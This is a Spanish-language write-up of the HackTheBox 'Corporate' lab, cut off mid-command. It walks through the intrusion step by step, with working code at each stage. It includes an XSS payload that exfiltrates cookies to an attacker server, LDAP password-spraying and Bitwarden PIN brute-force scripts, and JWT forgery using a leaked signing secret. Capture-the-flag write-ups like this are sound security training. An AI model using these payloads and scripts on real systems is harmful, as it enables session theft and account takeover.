---
title: "Máquina Corporate"
description: "Resolución de la máquina Corporate de HackTheBox"
categories: ["HackTheBox", "Insane", "Linux"]
tags: ["XSS", "CSP Bypass", "Pivoting", "Internal network", "IDOR", "Default credentials", "Bitwarden", "JWT Forgery", "Cookie signing"]
logo: "/assets/writeups/corporate/logo.webp"
---

El sitio de soporte de una compañia es vulnerable a inyección HTML que podremos utilizar para obtener cookies con un XSS en otra parte, luego accederemos a una red interna y veremos que cosas pasan por ahí...

## Reconocimiento

La máquina solo tiene un puerto abierto

```bash
# Nmap 7.94 scan initiated Sat Dec 16 21:23:04 2023 as: nmap -sS -Pn -vvv --open --min-rate 300 -n -p- -oN ports 10.129.173.164
# (Este escaneo es de cuando empezé a resolver la máquina, sí)
Nmap scan report for 10.129.173.164
Host is up, received user-set (0.15s latency).
Scanned at 2023-12-16 21:23:04 -04 for 411s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec 16 21:29:55 2023 -- 1 IP address (1 host up) scanned in 410.77 seconds
```

El sitio web, `corporate.htb` se ve bastante atractivo:

![Main web](/assets/writeups/corporate/1.png)

Se trata de un equipo de desarollo IT que ofrece servicios como desarrollo de software, diseño web, marketing digital y manejo de infraestructura de red.

Viendo abajo, nos da un formulario para introducir nuestro nombre y empezar un chat con el equipo de soporte técnico, completandolo nos envia a `support.corporate.htb` y nos abre un ticket junto con un chat para hablar con el respectivo agente de soporte:

![Support](/assets/writeups/corporate/2.png)

¡y es un chat en tiempo real! lo que lo hace aún más interesante.

Parece que esto se va a poner divertido, asi que vamos a ir viendo que podemos hacer para ganar acceso a partes privilegiadas de esta infraestructura.

## Intrusión

### Soporte - people.corporate.htb

Probando cosas en el chat de soporte, vemos que podemos introducir etiquetas HTML:

![Pre XSS](/assets/writeups/corporate/3.png)

Pero, si intentamos meter etiquetas para ejecutar código JavaScript nos saldrá en nuestro propio navegador que no se puede ejecutar ya que viola la política CSP, que podemos ver en la respuesta HTTP del servidor:

```bash
❯ curl -I http://support.corporate.htb
HTTP/1.1 200 OK
Date: Mon, 08 Jul 2024 20:21:36 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1725
Connection: keep-alive
ETag: W/"6bd-8ktIu9fKNl5w9xUHWMatLAOK6yo"
Content-Security-Policy: base-uri 'self'; default-src 'self' http://corporate.htb http://*.corporate.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://maps.googleapis.com https://maps.gstatic.com; font-src 'self' https://fonts.googleapis.com/ https://fonts.gstatic.com data:; img-src 'self' data: maps.gstatic.com; frame-src https://www.google.com/maps/; object-src 'none'; script-src 'self'
X-Content-Type-Options: nosniff
X-XSS-Options: 1; mode=block
X-Frame-Options: DENY
```

No vamos a poder ejecutar nada prácticamente porque ni siquiera podemos subir archivos a este sitio, pero si bien podemos meter etiquetas HTML que redirijan al usuario a otra parte no conocemos de otro lugar que pueda ser vulnerable a XSS... ¿o si?

El sitio que vimos al principio tiene una página 404 personalizada

![404](/assets/writeups/corporate/4.png)

Extrañamente, también podemos introducir etiquetas HTML en la URL y el sitio las proceserá, pero sigue estando bajo la misma CSP por lo que no podemos hacer mucho así sin más.

Pero, viendo las assets que carga la página hay una que llama la atención

![Assets](/assets/writeups/corporate/5.png)

Hay dos versiones... ¿distintas de `analytics.min.js`?

Jugando con los parámetros de ambas, hay una en el que el cambio del parámetro `v` se ve reflejado, precisamente la de `/assets/js/analytics.min.js`

![Uh oh](/assets/writeups/corporate/6.png)

Podemos intentar cargar esta asset que podemos modificar en la página 404 vulnerable ya que al estar en el mismo dominio, no violaría la política CSP y en caso de todo ir bien, ya tendríamos un vector para XSS. Pero al tratarse de una asset traspilada no podemos predecir bien el comportamiento de esta o si tiene dependencias, asi que vamos a averiguarlo simplemente probando y viendo la consola de nuestro navegador.

y efectivamente, luego de depurar y probar un rato cosas con este script, logramos obtener un XSS:

![XSS](/assets/writeups/corporate/7.png)

Ahora, necesitamos algo para redirigir al usuario que mira nuestros mensajes a este lugar. Esto puede hacerse fácilmente con HTML y sus etiquetas `<meta>`. Hagamos una url para sacarle sus cookies por ejemplo:

```html
<meta http-equiv="refresh" content='0; url=http://corporate.htb/init</script><script src="/vendor/analytics.min.js"></script><script src="/assets/js/analytics.min.js?v=1));setTimeout(function(){window.location=`http://<yourserver:port>/?${document.cookie}`},3000);//"></script><style>'>
```

Al colocar esto en nuestro ticket, seremos redirigidos también a nuestra página, pero viendo las peticiones del servidor

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.219 - - [08/Jul/2024 16:46:40] "GET /? HTTP/1.1" 200 -
10.10.14.219 - - [08/Jul/2024 16:46:40] code 404, message File not found
10.10.14.219 - - [08/Jul/2024 16:46:40] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.219 - - [08/Jul/2024 16:48:06] "GET /? HTTP/1.1" 200 -
10.10.11.246 - - [08/Jul/2024 16:48:06] "GET /?CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MiwibmFtZSI6IkNhbmRpZG8iLCJzdXJuYW1lIjoiSGFja2V0dCIsImVtYWlsIjoiQ2FuZGlkby5IYWNrZXR0QGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjA0NzE2NzcsImV4cCI6MTcyMDU1ODA3N30.VD7q3xFRfyKTmJXAOaaIWL56iJJt87R3DiBZXs1Wkl8 HTTP/1.1" 200 -
```

Pues bien, tenemos una cookie ahora.

Okay pero, ¿y en qué lugar puedo usar esta cookie? Fuzzeando por subdominios, encontramos cosas interesantes:

```bash
❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.246/ -mc all -fs 175 -H "Host: FUZZ.corporate.
htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.246/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.corporate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 175
________________________________________________

git                     [Status: 403, Size: 159, Words: 3, Lines: 8, Duration: 151ms]
support                 [Status: 200, Size: 1725, Words: 383, Lines: 39, Duration: 293ms]
sso                     [Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 163ms]
people                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 247ms]12
```

Accediendo al de `sso` con la cookie que obtuvimos puesta, podemos ver que tenemos dos servicios para seleccionar y autenticarnos a través de SSO (Single Sign On)

![SSO](/assets/writeups/corporate/8.png)

No conocemos la contraseña asi que lo segundo no nos interesa. Pero en cambio la primera opción nos lleva a un sitio para los empleados:

![People](/assets/writeups/corporate/9.png)

Este sitio parece que es donde los empleados guardan sus cosas, se comunican y demás, por lo que vamos a husmear.

### Red interna y Elwin Jones - 10.9.0.4

El usuario que comprometimos tiene archivos almacenados que podemos ver en la sección `Sharing`, y uno que llama la atención es un archivo de OpenVPN:

![Files](/assets/writeups/corporate/10.png)

Los otros son solo documentos de negocios y actas entre compañías. Nada de interés.

Viendo este archivo OpenVPN, parece que es para conectarse a lo que se le podría llamar la Intranet de este equipo de trabajo. Utiliza el puerto 1194 por UDP que en efecto, podemos verificar que está abierto con nmap. Vamos a conectarnos a ver que hay por ahí

```bash
❯ doas openvpn candido-hackett.ovpn 
doas (vzon@pwnedz0n) password: 
2024-07-08 17:06:32 Note: Kernel support for ovpn-dco missing, disabling d
ata channel offload.
2024-07-08 17:06:32 OpenVPN 2.6.11 [git:makepkg/ddf6bf6d2a135835+] x86_64-
pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AE
AD] [DCO] built on Jun 20 2024
2024-07-08 17:06:32 library versions: OpenSSL 3.3.1 4 Jun 2024, LZO 2.10
2024-07-08 17:06:32 DCO version: N/A
2024-07-08 17:06:32 TCP/UDP: Preserving recently used remote address: [AF_
INET]10.10.11.246:1194
2024-07-08 17:06:32 Socket Buffers: R=[212992->212992] S=[212992->212992]
2024-07-08 17:06:32 UDPv4 link local: (not bound)
2024-07-08 17:06:32 UDPv4 link remote: [AF_INET]10.10.11.246:1194
2024-07-08 17:06:32 TLS: Initial packet from [AF_INET]10.10.11.246:1194, s
id=1901d30c 72d68638
2024-07-08 17:06:33 VERIFY OK: depth=1, CN=cn_x8JFkEJtALa8DesC
2024-07-08 17:06:33 VERIFY KU OK
2024-07-08 17:06:33 Validating certificate extended key usage
2024-07-08 17:06:33 ++ Certificate has EKU (str) TLS Web Server Authentica
tion, expects TLS Web Server Authentication
2024-07-08 17:06:33 VERIFY EKU OK
... [snip]
2024-07-08 17:06:33 PUSH: Received control message: 'PUSH_REPLY,route-nopull,route 10.9.0.0 255.255.255.0,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-128-GCM'
2024-07-08 17:06:33 Options error: option 'route-nopull' cannot be used in this context ([PUSH-OPTIONS])
2024-07-08 17:06:33 OPTIONS IMPORT: --ifconfig/up options modified
2024-07-08 17:06:33 OPTIONS IMPORT: route options modified
2024-07-08 17:06:33 OPTIONS IMPORT: route-related options modified
2024-07-08 17:06:33 net_route_v4_best_gw query: dst 0.0.0.0
2024-07-08 17:06:33 net_route_v4_best_gw result: via 192.168.1.1 dev wlp1s0
2024-07-08 17:06:33 ROUTE_GATEWAY 192.168.1.1/255.255.0.0 IFACE=wlp1s0 HWADDR=f0:d5:bf:2f:a4:ef
2024-07-08 17:06:33 TUN/TAP device tun1 opened
2024-07-08 17:06:33 net_iface_mtu_set: mtu 1500 for tun1
2024-07-08 17:06:33 net_iface_up: set tun1 up
2024-07-08 17:06:33 net_addr_v4_add: 10.8.0.2/24 dev tun1
2024-07-08 17:06:33 net_route_v4_add: 10.9.0.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
2024-07-08 17:06:33 Initialization Sequence Completed
2024-07-08 17:06:33 Data Channel: cipher 'AES-128-GCM', peer-id: 0
2024-07-08 17:06:33 Timers: ping 10, ping-restart 120
2024-07-08 17:06:33 Protocol options: explicit-exit-notify 1
```

Como podemos ver en el log de OpenVPN, se nos agregan dos rutas nuevas: `10.8.0.2/24` y `10.9.0.0/24`. La primera parece ser para los clientes y la segunda para las estaciones de trabajo.

Solamente hay dos servidores disponibles, el gateway `10.8.0.1` y `10.9.0.4`:

```bash
# Nmap 7.94 scan initiated Mon Dec 18 21:11:18 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports_ovpn --min-rate 200 10.8.0.1
Nmap scan report for 10.8.0.1
Host is up, received user-set (0.32s latency).
Scanned at 2023-12-18 21:11:18 -04 for 208s
Not shown: 61278 closed tcp ports (reset), 4249 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 64
80/tcp   open  http          syn-ack ttl 64
389/tcp  open  ldap          syn-ack ttl 64
636/tcp  open  ldapssl       syn-ack ttl 64
2049/tcp open  nfs           syn-ack ttl 64
3004/tcp open  csoftragent   syn-ack ttl 64
3128/tcp open  squid-http    syn-ack ttl 64
8006/tcp open  wpl-analytics syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Dec 18 21:14:46 2023 -- 1 IP address (1 host up) scanned in 208.83 seconds
```

```bash
# Nmap 7.94 scan initiated Fri Dec 22 12:01:20 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN 10.9.0.4 --min-rate 300 10.9.0.4
Nmap scan report for 10.9.0.4
Host is up, received user-set (0.49s latency).
Scanned at 2023-12-22 12:01:20 -04 for 180s
Not shown: 62515 closed tcp ports (reset), 3018 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
111/tcp open  rpcbind syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec 22 12:04:20 2023 -- 1 IP address (1 host up) scanned in 180.18 seconds
```

Okay, del servidor principal podemos ver puertos que no podíamos ver antes: Por LDAP y NFS nos pide credenciales y en el 8006 hay una consola de Proxmox a la que no tenemos acceso:

![Proxmox](/assets/writeups/corporate/11.png)

El otro puerto 3128 es también parte del Proxmox mientras que el 3004 es un Gitea interno, probablemente donde el equipo guarda sus proyectos pero no parece haber algo interesante, seguramente porque sus repositorios son privados. Viendo que no podemos hacer mucho por acá aún, volvamos al sitio web de People.

Husmeando por las funciones, en la sección que vimos antes de `Sharing` hay algo para compartir archivos, puede que ya lo hayas notado antes al ver los botoncitos de grafos:

![Share](/assets/writeups/corporate/12.png)

Rellenando el email y luego interceptando la petición, podemos ver los campos:

`fileId=219&email=candido.hackett%40corporate.htb`

El `fileId` se ve interesante, pero aunque intentemos cambiarlo a otro Id la página nos dirá que no podemos compartirnos archivos con nosotros mismos. Parece que ver si esto es vulnerable a un IDOR necesitaremos otra cuenta... y afortunadamente como ya lo habrás notado antes, en la sección de soporte hay cerca de 5 usuarios distintos que nos pueden atender, vamos a robarle las cookies a otro e intentar hacer esto desde ahí.

En este caso utilizaremos a Rosalee Schmitt, al cambiar el fileId a 1 por ejemplo, aunque no se trate de un fichero de Rosalee nos lo comparte a Candido y viendo quien lo compartió:

![IDOR](/assets/writeups/corporate/13.png)

¡Tenemos un IDOR!

Let's see, la única restricción que bien tenemos es que no podemos compartir archivos sensibles como los ficheros de OpenVPN, pero del resto podemos ver otros tipos de documentos que nos pueden ser de interés... si vamos probando veremos que por cada usuario hay 1 o 4 documentos de Word y el archivo final que siempre llevan almacenado (o, el más viejo) es el archivo .ovpn de sus perfiles, por lo que podriamos automatizar esto con un script en Python. Te dejo como reto hacerlo.

Después de ver **varios** archivos, el archivo con id `123` se ve distinto a los demás:

![Welcome To](/assets/writeups/corporate/14.png)

El PDF da las bienvenida a los nuevos usuarios y la respectiva orientación acerca de su nuevo trabajo, pero hay algo interesante en las últimas páginas que dicta:

>Onboarding: Your onboarding process will include a range of activities designed to help
>   you learn about our company culture, values, and expectations. You'll also receive
>   training on the tools and systems you'll be using in your role.
>
> You’ve been setup a shiny new email with the format
>“firstname.lastname@corporate.htb” and you’ll have access to our fantastic Our
> People service.
>
> Your default password has been set to “CorporateStarterDDMMYYYY” – where your
> DDMMYYYY is your birthday. Please remember to change this as soon as you have
> access to a workstation machine!
>
> You should have also received a VPN pack that allows you to remotely access our
> internal resources. If you have any issues with using this, feel free to contact any
> member of IT and they’ll help you get setup.
 
Tenemos un formato de contraseña por defecto para probar contra los distintos usuarios que hay registrados en la página. Cóntandolos por el id son un total de 77 usuarios con el rango de IDs \\( [5001,5078] \\). Podemos escribir un script en Python que nos automatize la tarea de fuerza bruta y construcción de las contraseñas ya que sus fechas de compleaños están en su página de perfil, que podemos parsear al estar representado en HTML.

El servicio contra el que vamos a probar las credenciales es LDAP, ya que por su mecanismo de autenticación simple podemos tomar el nombre de usuario directamente de la página que estamos parseando y probar fácilmente lo que nos estamos armando:

```python
import requests
import ldap3
import time

from bs4 import BeautifulSoup

# Set the cookie and open file to save valid users
cookie = "<YOUR-COOKIE-HERE>"
file = open("valid_users.txt", "w")

counter = 0
server = ldap3.Server(host="10.8.0.1",port=389)

print("Building passwords...")
# Users are in this numeric range
for x in range(5001,5078):
    html = BeautifulSoup(requests.get(f"http://people.corporate.htb/employee/{x}", cookies={"CorporateSSO":cookie}).text, features='lxml')
    element = html.find(class_="table")
    td_elements = element.find_all('td', limit=4)

    # Date is always on 4th column
    date_string = td_elements[3].text
    # Email has the name and is on the 3rd column
    username = td_elements[2].text.split("@")[0]

    time_struct = time.strptime(date_string, '%m/%d/%Y')
    date = time.strftime("%d%m%Y", time_struct)
    final_password = f"CorporateStarter{date}"
    
    conn = ldap3.Connection(server,user=f"uid={username},ou=users,dc=corporate,dc=htb", password=final_password, authentication="SIMPLE")
    authenticated = conn.bind(True)
    if authenticated:
        print(f"Got auth with uid {username}")
        file.write(f"{username}:{final_password}")
        counter = counter + 1

print(f"Wrote {counter} valid users.")
file.close()
```
{: file="ldap_brute.py" }

Viendo la salida, podemos ver unos cuantos:

```bash
❯ python3.12 ldap_brute.py
Building passwords...
Got auth with uid 
elwin.jones
Got auth with uid 
laurie.casper
Got auth with uid 
nya.little
Got auth with uid 
brody.wiza
Wrote 4 valid users.
❯ cat valid_users.txt 

elwin.jones:CorporateStarter04041987
laurie.casper:CorporateStarter18111959
nya.little:CorporateStarter21061965
brody.wiza:CorporateStarter14071992
```

Los últimos 3 no nos son de interés ya que son trabajadores comunes, pero Elwin Jones tiene un rol especial de IT que por lo que podemos imaginar, debe estar involucrado en temas del desarrollo de los servicios (irónico que alguien con ese rol tenga la contraseña por defecto). Aún así intentando acceder a la workstation en `10.9.0.4` con alguna de estas credenciales nos deja y ya podremos tomar la primera flag:

```bash
❯ /usr/bin/ssh elwin.jones@10.9.0.4 
elwin.jones@10.9.0.4 password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue  9 Jul 18:19:31 UTC 2024

  System load:  0.0               Processes:                107
  Usage of /:   61.5% of 6.06GB   Users logged in:          1
  Memory usage: 18%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens18:   10.9.0.4


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul  9 18:19:31 2024 from 10.9.0.1
elwin.jones@corporate-workstation-04:~$ ls 
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
elwin.jones@corporate-workstation-04:~$ cat user.txt
77f99ba0764541edd72788dfc7******
```

> Nota adicional: Tuve que volver a crear la interfaz de red de la workstation y montarle todo, parecía que un graciosito la eliminó (guarde las credenciales que obtuve cuando pwnee toda la máquina). Si por algún motivo no te permite hacerle ping a 10.9.0.4 intenta reiniciar la máquina.
{: .prompt-info }

## Escalada de privilegios

### sysadmin - 10.9.0.1

Viendo los dotfiles de Elwin, podemos ver que tuvo instalado Firefox:

```bash
elwin.jones@corporate-workstation-04:~$ cd .mozilla
elwin.jones@corporate-workstation-04:~/.mozilla$ ls -la
total 16
drwx------  4 elwin.jones elwin.jones 4096 Apr 13  2023 .
drwxr-x--- 14 elwin.jones elwin.jones 4096 Nov 27  2023 ..
drwx------  2 elwin.jones elwin.jones 4096 Apr 13  2023 extensions
drwx------  6 elwin.jones elwin.jones 4096 Apr 13  2023 firefox
elwin.jones@corporate-workstation-04:~/.mozilla$ cd firefox
elwin.jones@corporate-workstation-04:~/.mozilla/firefox$ ls -al
total 32
drwx------  6 elwin.jones elwin.jones 4096 Apr 13  2023  .
drwx------  4 elwin.jones elwin.jones 4096 Apr 13  2023  ..
drwx------  3 elwin.jones elwin.jones 4096 Apr 13  2023 'Crash Reports'
-rw-rw-r--  1 elwin.jones elwin.jones   62 Apr 13  2023  installs.ini
drwx------  2 elwin.jones elwin.jones 4096 Apr 13  2023 'Pending Pings'
-rw-rw-r--  1 elwin.jones elwin.jones  259 Apr 13  2023  profiles.ini
drwx------ 13 elwin.jones elwin.jones 4096 Apr 13  2023  tr2cgmb6.default-release
drwx------  2 elwin.jones elwin.jones 4096 Apr 13  2023  ye8h1m54.default
```

y tenemos algunos perfiles, husmeando en ellos encontramos algo interesante en `tr2cgmb6.default-release` dentro de su `storage`:

```bash
elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release/storage/default$ ls -al
total 24
drwxr-xr-x 6 elwin.jones elwin.jones 4096 Apr 13  2023  .
drwxr-xr-x 6 elwin.jones elwin.jones 4096 Apr 13  2023  ..
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023  https+++addons.mozilla.org
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023  https+++bitwarden.com
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023  https+++www.google.com
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023 'moz-extension+++c8dd0025-9c20-49fb-a398-307c74e6f8b7^userContextId=4294967295'
elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release/storage/default$ cd https+++bitwarden.com/
elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release/storage/default/https+++bitwarden.com$ ls -al
total 16
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023 .
drwxr-xr-x 6 elwin.jones elwin.jones 4096 Apr 13  2023 ..
drwxr-xr-x 2 elwin.jones elwin.jones 4096 Apr 13  2023 ls
-rw-rw-r-- 1 elwin.jones elwin.jones   64 Apr 13  2023 .metadata-v2
elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release/storage/default/https+++bitwarden.com$ cd ls
elwin.jones@corporate-workstation-04:~/.mozilla/firefox/tr2cgmb6.default-release/storage/default/https+++bitwarden.com/ls$ ls -la
total 20
drwxr-xr-x 2 elwin.jones elwin.jones 4096 Apr 13  2023 .
drwxr-xr-x 3 elwin.jones elwin.jones 4096 Apr 13  2023 ..
-rw-r--r-- 1 elwin.jones elwin.jones 6144 Apr 13  2023 data.sqlite
-rw-rw-r-- 1 elwin.jones elwin.jones   12 Apr 13  2023 usage
```

De lo que podemos investigar, existe una extensión del gestor de credenciales Bitwarden para Firefox, por lo que aquí tiene que haber algo...

eh, pero volviendo atrás, además de usar las credenciales que encontramos en el SSH de la workstation podemos probarlas en otro lugar: El Gitea que vimos antes en `10.8.0.1:3004`. Intentando utilizar la credencial de Elwin nos dice que

![2FA](/assets/writeups/corporate/15.png)

La extensión de Bitwarden también tiene soporte para códigos TOTP, por lo que vamos a ver que hacemos con este perfil de Firefox.

Por si no lo sabias, al ser un perfil de Firefox podemos simplemente cargar esto en `about:profiles` y abrir Firefox con el nuevo perfil que acabamos de ajustar. Podremos verificarlo al ver el historial de navegación del nuevo perfil

![New profile](/assets/writeups/corporate/16.png)

Con solamente instalar la extensión que vemos, ya podremos ver que hay en este vault de Bitwarden, pero antes que nada parece que vamos a necesitar un PIN

![PIN](/assets/writeups/corporate/17.png)

Muy bien, si miras de nuevo el historial podrás notar que muy probablemente este usuario colocó un PIN de 4 dígitos, lo cual ciertamente es sencillo de romper, pero primero debemos investigar como esta extensión encripta las credenciales; buscando por GitHub encontraremos implementaciones cercanas a lo que queremos y con ello veremos que nos enfrentamos a un algoritmo PBKDF2 con HMAC, pero vamos a ir por partes:

Primero necesitamos el número de iteraciones que Bitwarden hace para este algoritmo, buscando por su guia oficial encontraremos esto:

> The default iteration count used with PBKDF2 is 600,001 iterations on the client (client-side iteration count is configurable from your account settings), and then an additional 100,000 iterations when stored on our servers (for a total of 700,001 iterations by default).

Bien, inspeccionando el código de las otras implementaciones [como esta](https://github.com/ambiso/bitwarden-pin/blob/main/src/main.rs) podemos ver que existe un valor con el pin encriptado que podemos utilizar para verificar si el PIN es correcto o no. Para no tener que indagar tanto usaré la herramienta `moz-idb-edit` para extraer todos estos datos a un JSON y buscar lo que quiero. La extensión guarda sus datos dentro de `storage/default/moz-extension+++<id>/idb/`.

```bash
❯ moz-idb-edit --dbpath 3647222921wleabcEoxlt-eengsairo.sqlite > asd.json
Using database path: 3647222921wleabcEoxlt-eengsairo.sqlite
❯ cat asd.json 
... [snip]
"user_08b3751b-aad5-4616-b1f7-015d3be749db_pinUnlock_oldPinKeyEncryptedMasterKey": {"__json__": true,"value": "\"2.DXGdSaN8tLq5tSYX1J0ZDg==|4uXLmRNp/dJgE41MYVxq+nvdauinu0YK2eKoMvAEmvJ8AJ9DbexewrghXwlBv9pR|UcBziSYuCiJpp5MORBgHvR2mVgx3ilpQhNtzNJAzf4M=\""}
... [snip]
```

y entre todo esto, también podemos ver un valor curioso:

```json
"user_08b3751b-aad5-4616-b1f7-015d3be749db_kdfConfig_kdfConfig": {"__json__": true,"value": "{\"iterations\":600000,\"kdfType\":0,\"memory\":null,\"parallelism\":null}"}
```

Parece que son 600000 iteraciones y no 600001, hmmm, un poco extraño pero supongamos que esta es la verdadera cantidad y hagamos un script en Python con lo que hemos entendido del algoritmo de encriptación de esta app para los vaults:

```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import ciphers, kdf, hashes, hmac, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.hkdf import HKDFExpand, HKDF
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms, modes
from pwn import *

import base64

pins = open("./pins.txt", "r").readlines()
privKeyBin = open("./encryptedPin.txt", "rb").read()
logg = log.progress("Decryption")
keyParts = privKeyBin.strip(b"\n").split(b".")[1].split(b"|")

iv = base64.b64decode(keyParts[0])
cipher = base64.b64decode(keyParts[1])
mac = base64.b64decode(keyParts[2])

for pin in pins:
  logg.status(f"Trying PIN: {pin}")
  kdf1 = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b"elwin.jones@corporate.htb", iterations=600000
                  ,backend=default_backend())
  hkdf_enc = HKDFExpand(algorithm=hashes.SHA256(), length=32, info=b"enc", backend=default_backend())
  hkdf_hash = HKDFExpand(algorithm=hashes.SHA256(), length=32, info=b"mac", backend=default_backend())

  pin_bytes = bytes(pin.strip("\n"), "utf-8")
  masterKey = kdf1.derive(pin_bytes)
  encKey = hkdf_enc.derive(masterKey)
  keyMac = hkdf_hash.derive(masterKey)

  h = hmac.HMAC(keyMac, hashes.SHA256(), backend=default_backend())
  h.update(iv)
  h.update(cipher)
  computed = h.finalize()

  if computed == mac:
    logg.success(f"PIN found! {pin}")
    exit(0)

logg.failure("PIN not found!")

```
{: file="bitwarden_brute.py" }

Al correrlo, no tardará mucho en encontrarnos el PIN (efectivamente, son 600000 iteraciones)

```bash
❯ python bitwarden_brute.py
[+] Decryption: PIN found! 0239
```

Pero tenemos un problema con la extensión; Si bien nos desbloquea el Vault parece que no funciona bien ya que tarda demasiado porque intenta hacerle petición a un recurso que no existe:

![Uh oh](/assets/writeups/corporate/18.png)

Podemos hacer que este dominio apunte a nuestro propio equipo agregandolo a nuestro archivo de hosts estáticos y así hacerlo fallar intecionalmente, para que esto cargue rápido. Haciéndolo funciona efectivamente y podemos ver la credencial de Elwin con su TOTP guardado:

![TOTP](/assets/writeups/corporate/19.png)

Con esto ya tendremos acceso al Gitea y podremos ver los repositorios con el código fuente de las aplicaciones web detrás de los tres subdominios `sso`, `support` y `people`. Los tres repositorios tienen un historial de commits un poco extenso.

Husmeando, vemos que en el repo `ourpeople` se filtra un dato muy sensible por parte de Beth Feest:

![Leak](/assets/writeups/corporate/20.png)

Uh oh, ese es el secret para firmar los JWT, ¡lo que significa que podemos autenticarnos como quien queramos al SSO con esto probablemente! Ahora, busquemos perfiles interesantes en Our People, los que me llaman personalmente la atención son aquellos que están en los grupos de ingenieros y sysadmins.

Extrañamente, inspeccionando el código del SSO podemos notar que los sysadmins no pueden reiniciar su contraseña:

```ts
... [snip]
      if (user.roles.includes("sysadmin")) {
        console.error("Refusing to allow password resets for high privilege accounts");
        return resolve({ success: false, error: "Refusing to process password resets for high privileged accounts." });
      }
... [snip]
```

Esto solo nos deja con la opción de los ingenieros, y con estos si que podemos llegar a hacer algo:

```bash
elwin.jones@corporate-workstation-04:~/.mozilla/firefox$ ls -la /var/run/docker*
-rw-r--r-- 1 root root       3 Jul  9 18:11 /var/run/docker.pid
srw-rw---- 1 root engineer   0 Jul  9 18:11 /var/run/docker.sock

ls: cannot open directory '/var/run/docker': Permission denied
```

Ya que la workstation tiene docker instalado, podemos aprovecharnos de esto para escalar privilegios.

Empezemos editando el JWT que obtuvimos al principio de todo como Candido Hackett para colocarlo en nombre de Gayle Graham (ID: 5025), dado que de lo único que depende el reinicio de contraseña son del campo `name`, `surname` y `requireCurrentPassword`, vamos a alterarlos a nuestro beneficio:

```bash
❯ jwt-tool -T -S hs256 -p '09cb527651c4bd385483815627e6241bdf40042a' eyJ
hbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MiwibmFtZSI6IkNhbmRpZG8iLCJz
dXJuYW1lIjoiSGFja2V0dCIsImVtYWlsIjoiQ2FuZGlkby5IYWNrZXR0QGNvcnBvcmF0ZS5odG
IiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQi
